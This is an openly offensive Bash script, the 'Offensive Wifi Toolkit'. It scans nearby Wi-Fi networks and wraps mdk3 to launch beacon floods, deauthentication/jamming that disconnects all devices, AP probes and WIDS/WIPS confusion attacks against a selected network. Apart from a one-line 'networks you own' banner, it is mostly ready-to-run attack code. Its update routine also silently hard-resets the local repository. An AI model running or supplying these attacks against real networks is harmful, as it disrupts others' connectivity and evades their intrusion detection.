#!/bin/bash
#Offensive Wifi Toolkit (owt) 
#Project start date (Feb. 8 2021)
#Created By Brennan Mccown (clu3bot)
#Version 1.2.1
#GPL v3.0 License
#
#colors vars
LBLUE='\033[1;34m'
LRED='\033[1;31m'
LGREEN='\033[1;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NONE='\033[0m'
#

#predifined vars
S=1000
mon=Monitor
man=Managed
version="1.0.0"
language="English"
user="clu3bot"
github="https://github.com/clu3bot/"
filename="OWT"
creator="Brennan Mccown (clu3bot)"
contactinfo="brennanmccown@protonmail.com"
#
clear
#
ewr() {
    sleep 0.05
    echo -e "$@"
}

check_for_updates () {

ewr "${YELLOW}Check for updates to owt tool${NONE}"
read -p "Press Enter to Continue.."
while [ `git stash --include-untracked | git reset --hard | git pull https://github.com/clu3bot/owt.git > git.txt` ]; do
ewr "${NONE}[${LRED}Checking for updates to owt tool${NONE}]"
ewr "\n${LBLUE}Please wait..${NONE}"
done;
if grep "Already" git.txt; then
ewr "${LRED}owt is already up to date!${NONE}"
rm -rf git.txt
sleep 0.2
else
ewr "${LRED}owt has been updated. Restart script for changes to take place.${NONE}"
sleep 1
rm -rf git.txt
exit
fi
}

#prints intro 1
intro_1 () {
echo -e "${LRED}
    ███████    █████   ███   █████ ███████████
  ███░░░░░███ ░░███   ░███  ░░███ ░█░░░███░░░█
 ███     ░░███ ░███   ░███   ░███ ░   ░███  ░ 
░███      ░███ ░███   ░███   ░███     ░███    
░███      ░███ ░░███  █████  ███      ░███    
░░███     ███   ░░░█████░█████░       ░███    
 ░░░███████░      ░░███ ░░███         █████   
   ░░░░░░░         ░░░   ░░░         ░░░░░ "  

echo -e "${YELLOW} \n         Offensive Wifi Toolkit (${filename})"
echo -e "${LBLUE}\n     Created by ${creator}"
echo -e "${LBLUE}                 Version ${version}${NONE}"
echo -e "${YELLOW}\n                     ...${NONE} "
sleep 1.5
clear
check_for_updates
}

#calls intro 1
intro_1

#Sleeps for 1 seconds
sleep 1
clear
#
check_for_root () {

    isroot=$(whoami)

    if [ "$isroot" = "root" ]; then
    check="true"
    else
    check="false"
    fi

}

#print intro 2
intro_2 () {
check_for_root 
ewr  "${LRED}Welcome To Offensive Wifi Toolkit${NONE}\n"
ewr  "${LGREEN}*********************************************${NONE}"
ewr  "${YELLOW}These tools are meant for use on networks you own\nHack at your own risk\n${NONE}"

if [ "$check" = "true" ]; then
perm="User is root"
else
perm="User is not root"
fi
ewr "[${LRED}Permission Status${NONE}] ${LBLUE}${perm}${NONE}"
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
ewr "[${LRED}Interface${NONE}] ${LBLUE}${iface}${NONE}"
dn=$(lsb_release -is)
ewr "[${LRED}Distribution${NONE}] ${LBLUE}${dn}${NONE}"
ewr "${LGREEN}*********************************************${NONE}"
ewr "${LBLUE}Check if all necessary packages are installed${NONE}"
read -p "Press Enter to Continue.."
}


permissions_prompt () {
check_for_root
if [ "$check" = "false" ]; then
ewr "${LRED}owt requires root permissions!\n${NONE}"
if [ "$check" = "true" ]; then
perm="User is root"
else
perm="User is not root"
fi
ewr "[${LRED}Permission Status${NONE}] ${LBLUE}${perm}${NONE}\n"
ewr "${YELLOW}Restart owt by using ${LRED}sudo bash owt.sh${NONE}"
ewr "\n${RED}Now exiting the script..${NONE}"
exit
else
sleep 0.1
fi
}

#checks perms
permissions_prompt
#calls intro 2
intro_2
#
clear

#checks for dependent packages
check_dependencies () {
permissions_prompt
dependencies=(aircrack-ng mdk3)
for d in "${dependencies[*]}"; do
if [ $(dpkg-query -W -f='${Status}' $d 2>/dev/null | grep -c "ok installed") -eq 0 ]; then
	echo -e "${LBLUE}The following packages must be installed for the script to run...\n${LRED}${d}\n${LBLUE}Would you like to install them now? (Y/N)"
read -p  r
if [[ "$r" == ["yY"]* ]]; then
	sudo apt-get install $d;
fi
fi
done
}

#calls check dependencies
check_dependencies

#checks if device is in monitor mode if not prompts the user to put device in monitor mode
check_monitor_mode () {
clear
echo -e "${LRED}All Packages have been installed successfully${NONE}"
echo -e "${LGREEN}*********************************************${NONE}"
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
Mod=Monitor
else
Mod=Managed
fi
if [ "$Mod" == "Monitor" ]; then
        sleep 0.1
else
        ewr "${LBLUE}This script requires $mon mode, would you like to enable it now? ${LRED}(Y/N)${NONE}"

	read -r re
fi
if [[ "$re" == ["yY"]* ]]; then
        ! sudo ifconfig $iface up
        echo -e "${YELLOW}${iface} is enabled${LRED}"
        sudo airmon-ng start $iface;
fi

}
#calls check monitor mode
check_monitor_mode


#puts interface in monitor mode
monitor_mode () {
clear
airmon-ng check kill
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
Mod=Monitor
else
Mod=Managed
fi
if [ "$Mod" == "Monitor" ]; then
clear
        echo -e "${LRED}Device already in $mon mode ${NONE}"
sleep 0.5
main_menu
else   
sudo airmon-ng start $iface
clear
echo -e "${LRED}Device now in $mon Mode${NONE}"
main_menu
fi
}

#puts interface in managed mode
managed_mode () {
clear
service network-manager start
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Managed" ]; then
Mod=Managed
else
Mod=Monitor
fi
if [ "$Mod" == "Managed" ]; then
clear
        echo -e "${LRED}Device already in $man mode ${NONE}"
sleep 0.5
main_menu
else
sudo airmon-ng stop $iface
fi
clear
echo -e "${LRED}Device now in $man Mode${NONE}"
main_menu
}

#scans for networks in the area then lists them
scan_networks () {
clear
        iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
        mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
        Mod=Monitor
else
        Mod=Managed
fi
if [ "$Mod" == "Monitor" ]; then
        sleep 0.1
else
        echo -e "${LRED}This tool requires Monitor Mode${NONE}"
        read -p "Press Enter to continue to Main Menu"
                main_menu
fi
        echo -e "${NONE}[${LRED}Scaning for Networks${NONE}]"

                trap "airmon-ng stop wlan0mon > /dev/null;rm otp-01.csv 2> /dev/null" EXIT
                xterm -e airodump-ng --output-format csv -w otp $iface > /dev/null & sleep 10 ; kill $!
        sed -i '1d' otp-01.csv
kill %1
        echo -e "\n\n${LRED}Scan Results${NONE}"
        cut -d "," -f 14 otp-01.csv | nl -n ln -w 6
                while [ ${S} -gt `wc -l otp-01.csv | cut -d " " -f 1` ] || [ ${S} -lt 1 ]; do
        echo -e "\n${LBLUE}Select a Network"
        read -p "$(tput setaf 7) " S
done
                nn=`sed -n "${S}p" < otp-01.csv | cut -d "," -f 14 `
        rm -rf otp-01.csv 2> /dev/null
        echo -e "\n[${LGREEN}${nn}${NONE} ] Selected"
        read -p "$(tput setaf 7)Press Enter to Continue.."
clear
        main_menu
}


#about page menu
about_page () {
clear

	ewr "${LRED}About${NONE}"
	ewr "${LGREEN}********************************${NONE}"
	ewr "${YELLOW}Creator${NONE}:${YELLOW}$creator${NONE}"
	ewr "${YELLOW}Github${NONE}:${YELLOW}$github${NONE}"
	ewr "${YELLOW}Language${NONE}:${YELLOW}$language${NONE}"
	ewr "${YELLOW}Version${NONE}:${YELLOW} $version${NONE}"
	ewr "${YELLOW}Filename${NONE}:${YELLOW}$filename${NONE}"
	ewr "${YELLOW}Contact${NONE}:${YELLOW}$contactinfo${NONE}"
	ewr "${LGREEN}********************************${NONE}"
	ewr "${LRED}Press 1 for Main Menu${NONE}"
}

#wifi attacks menu
wifi_attacks_menu () {
clear
checkMode1
	ewr "\n${NONE}[${LRED}Interface${NONE}]${LBLUE} ${iface}${NONE}   [${LRED}Mode${NONE}]${LBLUE} ${Mod}${NONE}   [${LRED}Target Network${NONE}]${LBLUE} ${nn}${NONE}\n"
	ewr "${LGREEN}*****************${NONE}"
	ewr "[${LBLUE}General${NONE}]"
	ewr "${YELLOW}0]Main Menu"
	ewr "${LGREEN}*****************${NONE}"
	ewr "[${LBLUE}Wifi Attacks${NONE}]"
	ewr "${YELLOW}1]Beacon Flood Attack"
	ewr "${YELLOW}2]Deauth/Jamming Attack"
	ewr "${YELLOW}3]Basic AP Probe"
	ewr "${YELLOW}4]WIDS/WIPS Confusion Attack"
	ewr "${LGREEN}*****************${NONE}"
while true; do
echo -e "${LRED}Select an option:${NONE}"
read -p "$(tput setaf 7)" option
case $option in  

  0) echo -e "\n${NONE}${YELLOW}Selected${NONE}${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
     main_menu
     ;;
  1) echo -e "\n${YELLOW}Selected${NONE}${NONE} [${YELLOW}$option${NONE}]"
     read -p  "Are you sure? Press Enter.."
     beacon_flood_attack
     ;;
  2) echo -e "\n${YELLOW}Selected${NONE}${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
     deauth_attack
     ;;
  3) echo -e "\n${YELLOW}Selected${NONE}${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
     probe_attack
     ;;
  4) echo -e "\n${YELLOW}Selected${NONE}${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
     confusion_attack
     ;;
  *) echo -e "Not an Option"
     wifi_attacks_menu
     ;;
esac
done
}

#beacon flood attack using mdk3
beacon_flood_attack () {
clear
check_mode
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
sleep 0.5
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Beacon Flood Selected${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Spamming Network APs${NONE}"
mdk3 $iface b -s 250
}

#airplay deauth attack using mdk3
deauth_attack () {
clear
check_mode
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
sleep 0.5
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Deauth/Jammer Selected${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Disconnecting all Devices From Networks..${NONE}"
mdk3 $iface d -c
}

#wids/wips confusion attack using mdk3
confusion_attack () {
clear
check_mode
check_network_name
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
sleep 0.5
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}AP Probe Selected${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}WIDS/WIPS Confusion Commencing.."
mdk3 $iface w -c -z -t $nn
}

#probe using mdk3
probe_attack () {
clear
check_mode
check_network_name
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
sleep 0.5
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}AP Probe Selected${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Probing Network.."
mdk3 $iface p -e $nn
}

#checks if interface is in monitor mode for variable assignment
check_mode_for_vars () {
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
Mod=Monitor
else
Mod=Managed
fi
}

#checks if interface is in monitor or managed mode /// for tools that require monitor
check_mode () {
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
Mod=Monitor
else
Mod=Managed
fi
if [ "$Mod" == "Monitor" ]; then
sleep 0.1
else
echo -e "${LRED}This tool requires $mon Mode${NONE}"
read -p "Press Enter to continue to Main Menu"
main_menu
fi
}

#checks if the network name is assigned
check_network_name () {
if [ -n "$nn" ]; then
sleep 0.1
else
echo -e "${LBLUE}For this you must select a Network, would you like do do this now? ${LRED}(Y/N)${NONE}"

read -r ra
fi
if [[ "$ra" == ["yY"]* ]]; then
        scan_network_networkname
sleep 0.5
else
clear
echo "Returning to Main Menu.."
sleep 0.8
main_menu
fi
}

#scan networks specifically for probe and wids/wips confusion
scan_network_networkname () {
clear
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
        Mod=Monitor
else
        Mod=Managed
fi
if [ "$Mod" == "Monitor" ]; then
        sleep 0.1
else
        echo -e "${LRED}This tool requires Monitor Mode${NONE}"
        read -p "Press Enter to continue to Main Menu"
                main_menu
fi
        echo -e "${NONE}[${LRED}Scaning for Networks${NONE}]"
        
                trap "airmon-ng stop wlan0mon > /dev/null;rm otp-01.csv 2> /dev/null" EXIT
                xterm -e airodump-ng --output-format csv -w otp $iface > /dev/null & sleep 10 ; kill $!
        sed -i '1d' otp-01.csv
kill %1
        echo -e "\n\n${LRED}Scan Results${NONE}"
        cut -d "," -f 14 otp-01.csv | nl -n ln -w 6
                while [ ${S} -gt `wc -l otp-01.csv | cut -d " " -f 1` ] || [ ${S} -lt 1 ]; do 
        echo -e "\n${LBLUE}Select a Network"
        read -p "$(tput setaf 7) " S
done
                nn=$(sed -n "${S}p" < otp-01.csv | cut -d "," -f 14 )
        rm -rf otp-01.csv 2> /dev/null
        echo -e "\n[${LGREEN}${nn}${NONE} ] Selected"
        read -p "$(tput setaf 7)Press Enter to Continue.."
clear
}

#stops or keeps monitor mode on termination

termination () {
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
Mod=Monitor
else
Mod=Managed
fi
if [ "$Mod" == "Managed" ]; then
exit
else
clear
echo -e "${LBLUE}Exiting OWT, would you like to remain in Monitor Mode? ${LRED}(Y/N)${NONE}"
read -r ro
fi
if [[ "$ro" == ["yY"]* ]]; then
exit
else
service network-manager start
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Managed" ]; then
Mod=Managed
else
Mod=Monitor
fi
if [ "$Mod" == "Managed" ]; then
clear
        echo -e "${LRED}Device already in $man mode ${NONE}"
sleep 0.5
main_menu
else
sudo airmon-ng stop $iface
fi
clear
exit
fi
}

trap termination EXIT

#prints options menu

main_menu () {
clear
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
Mod=Monitor
else
Mod=Managed
fi
	ewr "\n${NONE}[${LRED}Interface${NONE}]${LBLUE} ${iface}${NONE}   [${LRED}Mode${NONE}]${LBLUE} ${Mod}${NONE}   [${LRED}Target Network${NONE}]${LBLUE} ${nn}${NONE}\n"
	ewr "\n${NONE}[${LRED}Options${NONE}]"
	ewr "${LGREEN}*****************${NONE}"
	ewr "[${LBLUE}General${NONE}]"
	ewr "${YELLOW}0]Exit"
	ewr "${YELLOW}1]Main Menu"
	ewr "${YELLOW}2]Put Device in Monitor Mode"
	ewr "${YELLOW}3]Put Device in Managed Mode"
	ewr "${YELLOW}4]Scan Networks"
	ewr "${LGREEN}*****************${NONE}"
	ewr "[${LBLUE}Wifi Attacks${NONE}]"
	ewr "${YELLOW}5]Wifi Attack Menu${NONE}"
	ewr "${LGREEN}*****************${NONE}"
	ewr "[${LBLUE}Other${NONE}]"
	ewr "${YELLOW}6]About"
	ewr "${LGREEN}*****************${NONE}"
while true; do
ewr "\n${LRED}Select an option:${NONE}"
read -p "$(tput setaf 7)" option
case $option in  

  0) echo -e "\n${NONE}${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
	clear
     exit 0
     ;;
  1) echo -e "\n${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
     read -p  "Are you sure? Press Enter.."
     main_menu
     ;;
  2) echo -e "\n${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
     monitor_mode
     ;;
  3) echo -e "\n${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
     managed_mode
     ;;
  4) echo -e "\n${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
     scan_networks
     ;;
  5) echo -e "\n${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
     wifi_attacks_menu
     ;;
  6) echo -e "\n${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
     read -p "Are you sure? Press Enter.."
     about_page
     ;;
  *) echo -e "Not an Option"
     main_menu
     ;;
esac
done
}

#prints
clear
echo "Device now in ${mode} Mode"
sleep 1
main_menu

#functions
OWT () {
intro_1
intro_2
permissions_prompt
check_monitor_mode
check_dependencies
main_menu
monitor_mode
managed_mode
scan_networks
about_page
wifi_attacks_menu
beacon_flood_attack
deauth_attack
confusion_attack
probe_attack
check_mode_for_vars
check_mode
check_network_name
scan_network_networkname
termination
}

OWT
